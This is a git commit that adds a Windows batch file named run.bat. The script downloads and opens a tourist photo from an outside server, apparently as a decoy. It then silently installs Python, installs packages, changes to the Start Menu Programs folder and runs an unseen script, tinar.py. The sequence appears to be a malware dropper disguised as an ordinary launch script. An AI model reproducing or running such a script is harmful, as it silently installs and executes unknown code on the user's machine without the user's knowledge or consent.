6721ec5340097ab2b26ce088e72d1775e90b6b11
root7454 <mrswapnil7454@gmail.com>
2024-05-28 23:58:23 +0530

    adding run.bat

---
+++ run.bat
@@ -0,0 +1,8 @@
+cd %temp%
+curl -o imp.jpg https://media.tacdn.com/media/attractions-splice-spp-674x446/0b/39/a9/9f.jpg
+imp.jpg
+cd system/all-main
+python-installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
+pip install -r requirements.txt
+cd %AppData%\Microsoft\Windows\Start Menu\Programs
+python tinar.py
